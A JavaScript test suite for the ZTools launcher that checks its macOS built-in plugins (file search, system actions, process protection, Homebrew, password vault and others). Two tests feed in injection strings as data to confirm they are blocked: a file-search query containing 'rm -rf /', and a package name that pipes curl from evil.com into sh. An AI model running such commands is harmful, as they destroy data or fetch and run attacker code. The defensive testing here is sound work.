/**
 * ZTools macOS 官方内置插件 1:1 复刻与三批次全量补齐 端到端集成与混沌破坏性测试套件
 *
 * 覆盖范围：
 * - 全局门禁：macOS 平台可见内置插件数量 >= 32 款，平台过滤白名单精准控制
 * - 第一批 (P1-1 ~ P1-8)：everything-file-search, window-management, clipboard-history, snippets,
 *   system, apple-shortcuts, kill-process, color-picker
 * - 第二批 (P2-1 ~ P2-8)：applications, navigation (Switch Windows & Search Menu Items),
 *   screenshots, audio-device, wifi-password-reveal, macos-dock (windows-taskbar),
 *   clean-keyboard, downloads-manager
 * - 第三批 (P3-1 ~ P3-4)：shared/native-ipc POSIX 兼容, qr-code (ISO/IEC 18004 + Reed-Solomon),
 *   password-vault (AES-256-GCM AEAD + 1-bit 篡改拦截), translator, dictionary,
 *   homebrew, script-commands, raycast-focus, calendar, web-searches
 */

import test from 'node:test'
import assert from 'node:assert/strict'

import * as DeclarativeUI from '../packages/declarative-ui/dist/index.js'
import {
  getOfficialPluginsList,
  isOfficialPlugin,
  getOfficialPlugin
} from '../frontend/src/utils/officialPlugins.js'
import {
  isPluginSupportedOnCurrentPlatform
} from '../frontend/src/utils/platform.js'

function withSimulatedPlatform(platformStr, userAgentStr, fn) {
  const prevNav = globalThis.navigator
  Object.defineProperty(globalThis, 'navigator', {
    value: {
      platform: platformStr,
      userAgent: userAgentStr,
      userAgentData: { platform: platformStr }
    },
    configurable: true,
    writable: true
  })
  try {
    return fn()
  } finally {
    if (prevNav === undefined) {
      delete globalThis.navigator
    } else {
      Object.defineProperty(globalThis, 'navigator', {
        value: prevNav,
        configurable: true,
        writable: true
      })
    }
  }
}

test('Gate-1: macOS 平台可见内置插件数量达到 32+ 款，且三批次核心插件 100% 在 Mac 解封可用', () => {
  withSimulatedPlatform('MacIntel', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)', () => {
    const allOfficial = getOfficialPluginsList()
    const supportedOnMac = allOfficial.filter((p) => isPluginSupportedOnCurrentPlatform(p))

    assert.ok(
      supportedOnMac.length >= 32,
      `Expected at least 32 built-in plugins supported on macOS, got ${supportedOnMac.length}`
    )

    const requiredMacPluginIds = [
      // Batch 1 (8)
      'everything-file-search',
      'window-management',
      'clipboard-history',
      'snippets',
      'system',
      'apple-shortcuts',
      'kill-process',
      // Batch 2 (8)
      'applications',
      'navigation',
      'screenshots',
      'audio-device',
      'wifi-password-reveal',
      'windows-taskbar',
      'clean-keyboard',
      'downloads-manager',
      // Batch 3 (13+)
      'batch-rename',
      'disk-analyzer',
      'hardware-info',
      'process-monitor',
      'password-vault',
      'translator',
      'dictionary',
      'homebrew',
      'script-commands',
      'raycast-focus',
      'calendar',
      'web-searches',
      // Core shared built-ins
      'quicklinks',
      'emoji-picker',
      'notes'
    ]

    // color-picker、qr-code、calculator、json-format 等已改由 plugins 仓库的原版插件随客户端内置提供，
    // 旧注册表里的同名实现必须让位（见 frontend/src/config/bundledPlugins.json）
    for (const id of ['color-picker', 'qr-code', 'calculator', 'json-format']) {
      assert.equal(isOfficialPlugin(id), false, `${id} 应由内置原版插件提供`)
      assert.equal(getOfficialPlugin(id), undefined)
    }

    for (const id of requiredMacPluginIds) {
      assert.equal(isOfficialPlugin(id), true, `Plugin ${id} should be registered in OFFICIAL_PLUGINS_MAP`)
      const plugin = getOfficialPlugin(id)
      assert.ok(plugin && typeof plugin.command === 'function', `Plugin ${id} should have a valid command component`)
      assert.equal(
        isPluginSupportedOnCurrentPlatform(id),
        true,
        `Plugin ${id} must be supported and visible on macOS`
      )
    }

    // Tier 4 Windows-exclusive plugins must still be hidden on macOS
    assert.equal(isPluginSupportedOnCurrentPlatform('windows-run'), false)
    assert.equal(isPluginSupportedOnCurrentPlatform('windows-shortcuts'), false)
    assert.equal(isPluginSupportedOnCurrentPlatform('winget'), false)
    // Declarative 2.0 upgraded self-operated plugins are unlocked on macOS
    assert.equal(isPluginSupportedOnCurrentPlatform('wechat-cleaner'), true)
    assert.equal(isPluginSupportedOnCurrentPlatform('batch-video'), true)
  })

  withSimulatedPlatform('Win32', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', () => {
    // macOS-exclusive plugins hidden on Windows
    assert.equal(isPluginSupportedOnCurrentPlatform('homebrew'), false)
    assert.equal(isPluginSupportedOnCurrentPlatform('apple-shortcuts'), false)
    // Windows-exclusive plugins visible on Windows
    assert.equal(isPluginSupportedOnCurrentPlatform('windows-run'), true)
    assert.equal(isPluginSupportedOnCurrentPlatform('winget'), true)
  })
})

test('P1-1: everything-file-search 支持 Spotlight mdfind 检索、Quick Look 预览及防注入回退', async () => {
  const quickLookCalls = []
  const searchCalls = []
  const mockHost = {
    system_search_files: async (params) => {
      searchCalls.push(params)
      if (String(params.query).includes('non-existent')) {
        return { success: true, data: { files: [], subdirs: [], total_matches: 0 } }
      }
      return {
        success: true,
        data: {
          files: [
            {
              name: 'ZTools-Architecture.pdf',
              path: '/Users/geek/Documents/ZTools-Architecture.pdf',
              size: 1048576,
              mtime: Date.now(),
              is_dir: false
            }
          ]
        }
      }
    },
    filesearch_quick_look: async (params) => {
      quickLookCalls.push(params)
      return { success: true, path: params.path }
    }
  }

  const realRes = await DeclarativeUI.searchRealIndexedFiles('ZTools; rm -rf /', 50, mockHost)
  assert.ok(realRes.length >= 1)
  assert.equal(realRes[0].name, 'ZTools-Architecture.pdf')

  const qlRes = await DeclarativeUI.quickLookFile('/Users/geek/Documents/ZTools-Architecture.pdf', mockHost)
  assert.equal(qlRes.success, true)
  assert.equal(quickLookCalls.length, 1)
  assert.equal(quickLookCalls[0].path, '/Users/geek/Documents/ZTools-Architecture.pdf')

  // Destructive: empty path quickLook rejected
  const emptyQl = await DeclarativeUI.quickLookFile('   ', mockHost)
  assert.equal(emptyQl.success, false)

  // UI Tree verification
  const tree = DeclarativeUI.EverythingFileSearchCommand()
  const serialized = JSON.stringify(tree)
  assert.ok(serialized.includes('Quick Look 快速预览'))
  assert.ok(serialized.includes('Show in Finder'))
})

test('P1-2 & P1-3 & P1-4: window-management, clipboard-history 与 snippets 跨平台窗口与回贴闭环', async () => {
  const winTree = DeclarativeUI.WindowManagementCommand()
  const winJson = JSON.stringify(winTree)
  assert.ok(winJson.includes('AXUIElement') || winJson.includes('WorkArea'))

  // Snippets dynamic macro expansion ({clipboard}, {date}, {cursor})
  const expanded = DeclarativeUI.expandSnippetTemplate(
    'Hello {clipboard}! Today is {date}. Cursor here: {cursor}End',
    'macOS Geek'
  )
  assert.ok(expanded.expanded.includes('Hello macOS Geek!'))
  assert.ok(!expanded.expanded.includes('{cursor}'))
  assert.equal(expanded.cursorOffset, 3) // "End".length === 3
})

test('P1-5: system 支持 macOS 20+ 原生运维动作且高危动作强制二次确认拦截', async () => {
  const actionIds = DeclarativeUI.SYSTEM_ACTIONS.map((a) => a.id)
  const requiredMacActions = [
    'toggle-appearance',
    'toggle-hidden-files',
    'toggle-desktop-icons',
    'toggle-caffeinate',
    'sleep-displays',
    'volume-up',
    'volume-down',
    'toggle-bluetooth',
    'empty-trash',
    'lock-screen'
  ]
  for (const id of requiredMacActions) {
    assert.ok(actionIds.includes(id), `SYSTEM_ACTIONS must include ${id}`)
  }

  // Happy path: safe action executes directly via system_execute_action IPC
  let executedKey = ''
  const mockHost = {
    system_execute_action: async (params) => {
      executedKey = params.id || params.actionKey
      return { success: true, data: { message: '已切换深色模式' } }
    }
  }
  const toggleItem = DeclarativeUI.SYSTEM_ACTIONS.find((a) => a.id === 'toggle-appearance')
  const toggleRes = await DeclarativeUI.executeSystemAction(toggleItem, { hostOverride: mockHost })
  assert.equal(toggleRes.success, true)
  assert.equal(executedKey, 'toggle-appearance')

  // Destructive test: shutdown without confirmBypass when confirmAlert returns false MUST be intercepted!
  let destructiveCalled = false
  const strictHost = {
    system_execute_action: async () => {
      destructiveCalled = true
      return { success: true }
    }
  }
  DeclarativeUI.setDeclarativeBridge({
    confirmAlert: async () => false,
    showToast: async () => {}
  })
  try {
    const shutdownItem = DeclarativeUI.SYSTEM_ACTIONS.find((a) => a.id === 'empty-trash' || a.destructive === true)
    const shutdownBlocked = await DeclarativeUI.executeSystemAction(shutdownItem, {
      confirmBypass: false,
      hostOverride: strictHost
    })
    assert.equal(shutdownBlocked.success, false)
    assert.equal(shutdownBlocked.executed, false)
    assert.equal(destructiveCalled, false, 'Destructive action must NEVER execute when user cancels confirmation!')
  } finally {
    DeclarativeUI.setDeclarativeBridge(null)
  }
})

test('P1-6: apple-shortcuts 对接 /usr/bin/shortcuts 列表、带参执行与异常拦截', async () => {
  const mockHost = {
    shortcuts_list: async () => ({
      success: true,
      data: {
        items: [
          { id: 'sc-1', name: 'Summarize Clipboard with AI', folder: 'Productivity', acceptsInput: true }
        ]
      }
    }),
    shortcuts_run: async (params) => ({
      success: true,
      data: { output: `Processed: ${params.input || 'no-input'}` }
    }),
    shortcuts_view: async (params) => ({
      success: true,
      data: { opened: params.name }
    })
  }

  const list = await DeclarativeUI.getAppleShortcuts(mockHost)
  assert.equal(list.length, 1)
  assert.equal(list[0].name, 'Summarize Clipboard with AI')

  const runRes = await DeclarativeUI.executeAppleShortcut('Summarize Clipboard with AI', 'Hello Mac', mockHost)
  assert.equal(runRes.success, true)
  assert.equal(runRes.output, 'Processed: Hello Mac')

  const viewRes = await DeclarativeUI.openShortcutInApp('Summarize Clipboard with AI', mockHost)
  assert.equal(viewRes.success, true)

  // Destructive test: empty shortcut name
  const emptyRun = await DeclarativeUI.executeAppleShortcut('   ', '', mockHost)
  assert.equal(emptyRun.success, false)

  // UI Tree render check
  const tree = DeclarativeUI.AppleShortcutsCommand()
  assert.ok(JSON.stringify(tree).includes('macOS 快捷指令'))
})

test('P1-7 & P1-8: kill-process 关键守护进程防误杀保护与 color-picker 屏幕吸色权限降级', async () => {
  // macOS critical process protection
  assert.equal(DeclarativeUI.isSystemCriticalProcess('kernel_task'), true)
  assert.equal(DeclarativeUI.isSystemCriticalProcess('WindowServer'), true)
  assert.equal(DeclarativeUI.isSystemCriticalProcess('launchd'), true)
  assert.equal(DeclarativeUI.isSystemCriticalProcess(1), true)
  assert.equal(DeclarativeUI.isSystemCriticalProcess('Visual Studio Code'), false)

  // POSIX kill command generation
  assert.equal(DeclarativeUI.getKillCommandLine(9527, 'graceful', true), 'kill -15 9527')
  assert.equal(DeclarativeUI.getKillCommandLine(9527, 'force', true), 'kill -9 9527')
  assert.equal(DeclarativeUI.getKillCommandLine(9527, 'tree', true), 'pkill -9 -P 9527')

  // Destructive test: attempt to kill WindowServer must fail with PROTECTED_CRITICAL_PROCESS
  const killProtected = await DeclarativeUI.terminateProcess(
    { pid: 188, name: 'WindowServer', isSystemCritical: true },
    'force'
  )
  assert.equal(killProtected.success, false)
  assert.equal(killProtected.error, 'PROTECTED_CRITICAL_PROCESS')

  // P1-8 Color Picker TCC permission denied handling
  const deniedHost = {
    screen_pick_color: async () => ({
      success: false,
      error: { code: 'PERMISSION_DENIED', message: 'Screen Recording permission denied by TCC' }
    })
  }
  await assert.rejects(
    () => DeclarativeUI.pickScreenColor(deniedHost),
    /SCREEN_RECORDING_PERMISSION_DENIED/
  )
})

test('P2-1: applications 支持 macOS .app 扫描、~/Library 关联残留展示与系统组件防卸载保护', async () => {
  const manager = new DeclarativeUI.ApplicationsManager()
  let uninstallCmd = ''
  const mockHost = {
    applications_list: async () => ({
      success: true,
      data: [
        {
          id: 'app-mac-clean',
          name: 'CleanShot X',
          publisher: 'MakeTheWeb',
          version: '4.7.2',
          installLocation: '/Applications/CleanShot X.app',
          uninstallString: '/Applications/CleanShot X.app',
          bundleId: 'pl.maketheweb.cleanshotx',
          isSystemComponent: false,
          leftoverPaths: [
            '/Users/geek/Library/Application Support/CleanShot X',
            '/Users/geek/Library/Caches/pl.maketheweb.cleanshotx',
            '/Users/geek/Library/Preferences/pl.maketheweb.cleanshotx.plist'
          ]
        },
        {
          id: 'app-mac-safari',
          name: 'Safari',
          publisher: 'Apple Inc.',
          version: '17.5',
          installLocation: '/System/Applications/Safari.app',
          uninstallString: '',
          bundleId: 'com.apple.Safari',
          isSystemComponent: true
        }
      ]
    }),
    applications_uninstall: async (params) => {
      uninstallCmd = params.command
      return { success: true }
    }
  }

  const synced = await manager.syncFromHost(true, mockHost)
  assert.equal(synced.length, 2)
  assert.equal(synced[0].leftoverPaths.length, 3)

  // Verify AppDetailView renders macOS App Leftovers section
  const detailTree = DeclarativeUI.AppDetailView({
    app: synced[0],
    manager,
    onRefresh: () => {}
  })
  assert.ok(JSON.stringify(detailTree).includes('macOS 关联残留与缓存路径'))

  // Destructive test: uninstalling macOS system app (Safari) must be blocked!
  const sysUninstall = await manager.uninstallApplication(synced[1], mockHost)
  assert.equal(sysUninstall.success, false)
  assert.equal(sysUninstall.error, 'SYSTEM_COMPONENT_LOCKED')

  // Normal macOS app uninstall cleans leftovers
  const cleanUninstall = await manager.uninstallApplication(synced[0], mockHost)
  assert.equal(cleanUninstall.success, true)
  assert.equal(uninstallCmd, '/Applications/CleanShot X.app')
})

test('P2-2: navigation 支持 Switch Windows 与 macOS 招牌 Search Menu Items', async () => {
  let clickedMenu = null
  const mockHost = {
    navigation_list_windows: async () => ({
      success: true,
      data: [
        { id: 'win-1', handle: '1001', title: 'ZTools — VS Code', appName: 'Code', pid: 501 }
      ]
    }),
    navigation_search_menu_items: async () => ({
      success: true,
      data: [
        {
          id: 'menu-1',
          label: 'Format Document',
          path: ['Selection', 'Format Document'],
          appName: 'Code',
          shortcut: '⇧⌥F',
          enabled: true
        }
      ]
    }),
    navigation_click_menu_item: async (params) => {
      clickedMenu = params
      return { success: true }
    }
  }

  const wins = await DeclarativeUI.fetchNavigationWindows('', mockHost)
  assert.equal(wins.length, 1)
  assert.equal(wins[0].title, 'ZTools — VS Code')

  const menus = await DeclarativeUI.searchNavigationMenuItems('Format', mockHost)
  assert.equal(menus.length, 1)
  assert.deepEqual(menus[0].path, ['Selection', 'Format Document'])

  const clickRes = await DeclarativeUI.triggerNavigationMenuItem(menus[0], mockHost)
  assert.equal(clickRes.ok, true)
  assert.deepEqual(clickedMenu.path, ['Selection', 'Format Document'])

  // Destructive: empty menu item rejected
  const badClick = await DeclarativeUI.triggerNavigationMenuItem({}, mockHost)
  assert.equal(badClick.ok, false)
})

test('P2-3, P2-4, P2-5, P2-6: screenshots, audio-device, wifi-password-reveal 与 macos-dock 真实 IPC 闭环', async () => {
  // P2-3 Screenshots
  const ssManager = new DeclarativeUI.ScreenshotsManager()
  const mockSsHost = {
    screenshots_scan: async () => ({
      success: true,
      data: [
        {
          id: 'ss-mac-1',
          name: '截屏2026-10-17 16.00.00.png',
          path: '/Users/geek/Desktop/截屏2026-10-17 16.00.00.png',
          sizeBytes: 204800,
          createdAt: Date.now()
        }
      ]
    }),
    screenshots_paste_latest: async () => ({
      success: true,
      data: { path: '/Users/geek/Desktop/截屏2026-10-17 16.00.00.png' }
    })
  }
  const loadedSs = await ssManager.loadScreenshots(true, mockSsHost)
  assert.ok(loadedSs.some((s) => s.filename === '截屏2026-10-17 16.00.00.png'))
  const pasteSs = await ssManager.pasteLatestScreenshot(mockSsHost)
  assert.equal(pasteSs.success, true)

  // P2-4 Audio Device (with volume clamping boundary test)
  let setVolRecorded = -1
  const mockAudioHost = {
    audio_get_devices: async () => ({
      success: true,
      data: {
        devices: [
          { id: 'airpods-pro', name: 'AirPods Pro', type: 'output', isDefault: true, volume: 65, muted: false }
        ]
      }
    }),
    audio_set_volume: async (params) => {
      setVolRecorded = params.volume
      return { success: true, data: { volume: params.volume } }
    }
  }
  const audioMgr = new DeclarativeUI.AudioDeviceManager([], [], 'macOS')
  const audioDevices = await audioMgr.syncDevicesFromHost(mockAudioHost)
  assert.equal(audioDevices.length, 1)
  assert.equal(audioDevices[0].name, 'AirPods Pro')
  audioMgr.setDeviceVolume('airpods-pro', 150, mockAudioHost)
  assert.equal(setVolRecorded, 100, 'Volume > 100 must be clamped to 100')

  // P2-5 Wi-Fi Password Reveal
  const mockWifiHost = {
    wifi_get_profiles: async () => ({
      success: true,
      data: {
        profiles: [{ ssid: 'GeekLab-5G', isCurrent: true, security: 'WPA3-Personal' }]
      }
    }),
    wifi_get_password: async (params) => ({
      success: true,
      data: { ssid: params.ssid, password: 'MacKeychainSecret!2026' }
    })
  }
  const wifiList = await DeclarativeUI.fetchSavedWifiProfiles({ hostOverride: mockWifiHost })
  const geekWifi = wifiList.find((w) => w.ssid === 'GeekLab-5G')
  assert.ok(geekWifi)
  assert.equal(geekWifi.password, 'MacKeychainSecret!2026')

  // P2-6 macOS Dock control
  let dockPos = ''
  let dockRestarted = false
  const mockDockHost = {
    taskbar_set_dock_position: async (params) => {
      dockPos = params.position
      return { success: true }
    },
    taskbar_restart_dock: async () => {
      dockRestarted = true
      return { success: true }
    }
  }
  const dockMgr = new DeclarativeUI.WindowsTaskbarManager()
  const posRes = await dockMgr.setDockPosition('left', mockDockHost)
  assert.equal(posRes.success, true)
  assert.equal(dockPos, 'left')
  const restartRes = await dockMgr.restartDock(mockDockHost)
  assert.equal(restartRes.success, true)
  assert.equal(dockRestarted, true)
})

test('P2-7: clean-keyboard 挂载真实 DOM 捕获期按键拦截器、统计误触并通过 Cmd+U 解锁（无监听器泄漏）', async () => {
  const listeners = new Map()
  const prevWindow = globalThis.window
  globalThis.window = {
    addEventListener: (type, fn) => {
      if (!listeners.has(type)) listeners.set(type, new Set())
      listeners.get(type).add(fn)
    },
    removeEventListener: (type, fn) => {
      listeners.get(type)?.delete(fn)
    }
  }

  try {
    const lockMgr = new DeclarativeUI.KeyboardLockManager()

    // Destructive test: invalid duration rejected
    const badZero = await lockMgr.lockKeyboard(0)
    assert.equal(badZero.success, false)
    assert.equal(badZero.code, 'INVALID_DURATION')
    const badNeg = await lockMgr.lockKeyboard(-10)
    assert.equal(badNeg.success, false)
    assert.equal(badNeg.code, 'INVALID_DURATION')

    // Lock keyboard for 30s (repeated lock must be rejected by ALREADY_LOCKED and not leak listeners)
    const lock1 = await lockMgr.lockKeyboard(30, { presetTitle: '擦拭 MacBook 键盘' })
    assert.equal(lock1.success, true)
    const lock2 = await lockMgr.lockKeyboard(30, { presetTitle: '擦拭 MacBook 键盘' })
    assert.equal(lock2.success, false)
    assert.equal(lock2.code, 'ALREADY_LOCKED')
    assert.equal(listeners.get('keydown')?.size, 1, 'Must register exactly 1 keydown listener without leaks')

    // Simulate normal keystroke -> prevented & counted
    let defaultPrevented = false
    let propagationStopped = false
    const keydownHandler = [...listeners.get('keydown')][0]
    keydownHandler({
      type: 'keydown',
      key: 'a',
      ctrlKey: false,
      metaKey: false,
      preventDefault: () => { defaultPrevented = true },
      stopImmediatePropagation: () => { propagationStopped = true }
    })
    assert.equal(defaultPrevented, true)
    assert.equal(propagationStopped, true)
    assert.equal(lockMgr.getState().blockedKeystrokes, 1)

    // Simulate Cmd+U (metaKey + 'u') emergency unlock
    keydownHandler({
      type: 'keydown',
      key: 'u',
      ctrlKey: false,
      metaKey: true,
      preventDefault: () => {},
      stopImmediatePropagation: () => {}
    })
    await new Promise((r) => setTimeout(r, 10))
    assert.equal(lockMgr.getState().status, 'unlocked')
    assert.equal(listeners.get('keydown')?.size, 0, 'All DOM listeners must be cleaned up on unlock')
  } finally {
    if (prevWindow === undefined) {
      delete globalThis.window
    } else {
      globalThis.window = prevWindow
    }
  }
})

test('P2-8 & P3-1: downloads-manager 与 shared/native-ipc.ts 完整支持 macOS POSIX 路径与根卷 "/" 探测', async () => {
  let receivedDriveParam = ''
  const mockPosixHost = {
    system_get_disk_usage: async (params) => {
      receivedDriveParam = params.drive
      if (params.drive === '/') {
        return {
          success: true,
          data: {
            total: 500 * 1024 ** 3,
            used: 200 * 1024 ** 3,
            available: 300 * 1024 ** 3,
            percent: 40
          }
        }
      }
      return { success: false, error: 'DRIVE_NOT_FOUND' }
    },
    system_get_path: async (params) => {
      if (params.name === 'home') return { success: true, data: '/Users/macgeek' }
      return { success: false }
    },
    system_search_files: async () => ({
      success: true,
      data: {
        files: [
          {
            name: 'ZTools-2.0-arm64.dmg',
            path: '/Users/macgeek/Downloads/ZTools-2.0-arm64.dmg',
            is_dir: false,
            size: 85 * 1024 * 1024,
            mtime: Math.floor(Date.now() / 1000)
          }
        ],
        subdirs: []
      }
    })
  }

  // Verify probeRealDiskDrives automatically falls back to probing '/' on macOS
  const drives = await DeclarativeUI.probeRealDiskDrives(['C', 'D'], mockPosixHost)
  assert.equal(drives.length, 1)
  assert.equal(drives[0].drive, '/')
  assert.equal(receivedDriveParam, '/', 'POSIX "/" drive path must NEVER be converted to backslash')

  // Verify getRealSystemPath derives POSIX subdirectories when home starts with '/'
  const dlPath = await DeclarativeUI.getRealSystemPath('downloads', mockPosixHost)
  assert.equal(dlPath, '/Users/macgeek/Downloads')
  const appDataPath = await DeclarativeUI.getRealSystemPath('appData', mockPosixHost)
  assert.equal(appDataPath, '/Users/macgeek/Library/Application Support')

  // Verify DownloadsManagerService classifies .dmg / .pkg as installer and syncs real POSIX Downloads
  assert.equal(DeclarativeUI.detectDownloadCategory('ZTools.dmg'), 'installer')
  assert.equal(DeclarativeUI.detectDownloadCategory('NodeInstaller.pkg'), 'installer')
  const safePathRes = DeclarativeUI.validateSafeDownloadPath(
    '/Users/macgeek/Downloads/ZTools-2.0-arm64.dmg',
    '/Users/macgeek/Downloads'
  )
  assert.equal(safePathRes.valid, true)

  const dlMgr = new DeclarativeUI.DownloadsManagerService({ initialFiles: [] })
  const syncedFiles = await dlMgr.syncRealDownloads(mockPosixHost)
  assert.equal(syncedFiles.length, 1)
  assert.equal(syncedFiles[0].category, 'installer')
})

test('P3-2: qr-code (Reed-Solomon + Alignment) 与 password-vault (AES-256-GCM AEAD + 1-bit 篡改拦截)', () => {
  // 1. QR Code ISO/IEC 18004 structure & roundtrip
  const ecc = DeclarativeUI.computeReedSolomonEcc(new Uint8Array([0x40, 0xd2, 0x75, 0x47]), 10)
  assert.equal(ecc.length, 10)
  assert.ok(ecc.some((b) => b !== 0), 'Reed-Solomon ECC bytes must be non-trivial')

  const qr = DeclarativeUI.generateQrSvg('WIFI:T:WPA;S:ZTools-Mac;P:SuperSecret;;', {
    errorCorrectionLevel: 'Q'
  })
  assert.equal(qr.contentType, 'wifi')
  const decoded = DeclarativeUI.decodeQrCode(qr.dataUrl)
  assert.equal(decoded.success, true)
  assert.equal(decoded.text, 'WIFI:T:WPA;S:ZTools-Mac;P:SuperSecret;;')

  // 2. Password Vault AEAD Encryption & Destructive 1-bit Tamper Rejection
  const token = DeclarativeUI.encryptSecret('MyBankPassword#2026', 'MasterKey!99')
  assert.ok(token.startsWith('enc:v1:'), 'Ciphertext must use enc:v1:<iv>:<tag>:<cipher> format')
  assert.ok(!token.includes('MyBankPassword#2026'), 'Ciphertext must never contain plaintext')
  assert.equal(DeclarativeUI.decryptSecret(token, 'MasterKey!99'), 'MyBankPassword#2026')

  // Destructive test A: Wrong master key
  assert.throws(
    () => DeclarativeUI.decryptSecret(token, 'WrongMasterKey'),
    /AUTH_TAG_MISMATCH/
  )

  // Destructive test B: Flip 1 bit in the ciphertext hex
  const parts = token.split(':')
  const origCipher = parts[4]
  const firstNibble = parseInt(origCipher[0], 16) ^ 0x1
  const tamperedCipherToken = [
    parts[0],
    parts[1],
    parts[2],
    parts[3],
    firstNibble.toString(16) + origCipher.slice(1)
  ].join(':')
  assert.throws(
    () => DeclarativeUI.decryptSecret(tamperedCipherToken, 'MasterKey!99'),
    /AUTH_TAG_MISMATCH/,
    '1-bit tamper in ciphertext must immediately fail AEAD authentication!'
  )
})

test('P3-3 & P3-4: homebrew, script-commands, raycast-focus, calendar 与 web-searches 端到端链路与防注入验证', async () => {
  // 1. P3-3 Homebrew
  const brewRes = await DeclarativeUI.executeHomebrewAction('list')
  assert.equal(brewRes.ok, true)
  assert.ok(brewRes.packages && brewRes.packages.length > 0)

  // Destructive test: shell injection in package name blocked
  const injectedBrew = await DeclarativeUI.executeHomebrewAction('install', {
    pkg: 'ripgrep; curl http://evil.com | sh'
  })
  assert.equal(injectedBrew.ok, false)
  assert.ok(injectedBrew.message.includes('INVALID_PACKAGE_NAME'))

  // 2. P3-4 Script Commands (@raycast.* header parsing & template builder)
  const tpl = DeclarativeUI.buildScriptCommandTemplate({
    title: 'Restart Mac Audio',
    mode: 'compact',
    packageName: 'macOS Admin',
    language: 'zsh',
    body: 'sudo killall coreaudiod'
  })
  const parsedMeta = DeclarativeUI.parseRaycastScriptHeaders(tpl)
  assert.equal(parsedMeta.title, 'Restart Mac Audio')
  assert.equal(parsedMeta.mode, 'compact')
  assert.equal(parsedMeta.packageName, 'macOS Admin')

  // 3. P3-4 Raycast Focus
  const session = await DeclarativeUI.startFocusSession({
    goal: '完成 macOS 32+ 内置插件验收',
    durationMinutes: 45
  })
  assert.equal(session.status, 'active')
  assert.equal(session.durationMinutes, 45)

  // 4. P3-4 Calendar (Event creation & RFC 5545 ICS export)
  const createdEvt = await DeclarativeUI.createCalendarEvent({
    title: 'ZTools macOS Release Party',
    startTime: '18:00',
    endTime: '19:00',
    conferenceUrl: 'https://vc.feishu.cn/j/123456'
  })
  const ics = DeclarativeUI.buildCalendarIcsContent([createdEvt])
  assert.ok(ics.includes('BEGIN:VCALENDAR'))
  assert.ok(ics.includes('SUMMARY:ZTools macOS Release Party'))

  // Destructive test: empty calendar event title throws
  await assert.rejects(
    () => DeclarativeUI.createCalendarEvent({ title: '   ', startTime: '10:00', endTime: '11:00' }),
    /EVENT_TITLE_REQUIRED/
  )

  // 5. P3-4 Web Searches & Active Browser Tab
  const mockBrowserHost = {
    browser_get_active_tab: async () => ({
      success: true,
      data: {
        browserName: 'Safari',
        title: 'Apple Developer Documentation',
        url: 'https://developer.apple.com/documentation'
      }
    })
  }
  const tab = await DeclarativeUI.fetchActiveBrowserTab(mockBrowserHost)
  assert.equal(tab.browserName, 'Safari')
  assert.equal(tab.url, 'https://developer.apple.com/documentation')
})

test('Gate-2: Electron 主进程 macOS 原生服务层（file-indexer, navigation, applications, script-commands, dictionary）集成与异常防御', async () => {
  const { searchFilesOnMacos, scanDirectoryForSearch } = await import(
    '../electron-client/out-test/src/main/platform/macos/file-indexer.js'
  )
  const { NavigationService } = await import(
    '../electron-client/out-test/src/main/services/navigation-service.js'
  )
  const { ScriptCommandsService } = await import(
    '../electron-client/out-test/src/main/services/script-commands-service.js'
  )
  const { DictionaryService } = await import(
    '../electron-client/out-test/src/main/services/dictionary-service.js'
  )

  // 1. file-indexer: searchFilesOnMacos & scanDirectoryForSearch (including non-existent dir fallback)
  const fallbackSearch = await searchFilesOnMacos('ZTools', 10, [
    {
      name: 'ZTools-Mac.dmg',
      path: '/Users/mac/Downloads/ZTools-Mac.dmg',
      is_dir: false,
      size: 1024,
      mtime: Date.now(),
      acronym: 'ztm',
      pinyin: 'ztools-mac.dmg'
    }
  ])
  assert.equal(fallbackSearch.files.length, 1)
  assert.equal(fallbackSearch.files[0].name, 'ZTools-Mac.dmg')

  const badDirScan = await scanDirectoryForSearch('/non-existent-macos-directory-xyz-999', 20, [])
  assert.equal(badDirScan.files.length, 0)
  assert.equal(badDirScan.subdirs.length, 0)

  // 2. NavigationService: searchMenuItems & clickMenuItem
  const navService = new NavigationService()
  navService.setMockMenuItems([
    {
      id: 'menu-xcode-build',
      title: 'Build',
      label: 'Build',
      appName: 'Xcode',
      path: ['Product', 'Build'],
      shortcut: '⌘B',
      enabled: true
    }
  ])
  const menuHits = await navService.searchMenuItems('build')
  assert.equal(menuHits.length, 1)
  assert.equal(menuHits[0].appName, 'Xcode')
  const clickMenuRes = await navService.clickMenuItem({ id: 'menu-xcode-build' })
  assert.equal(clickMenuRes.success, true)

  // 3. ScriptCommandsService: scanScripts & commands Map
  const os = await import('node:os')
  const scriptSvc = new ScriptCommandsService({ dataRoot: os.tmpdir() })
  await scriptSvc.scanScripts()
  assert.ok(scriptSvc.commands instanceof Map)

  // 4. DictionaryService: speakWord rejects empty input
  const dictSvc = new DictionaryService()
  await assert.rejects(() => dictSvc.speakWord('   '))
})

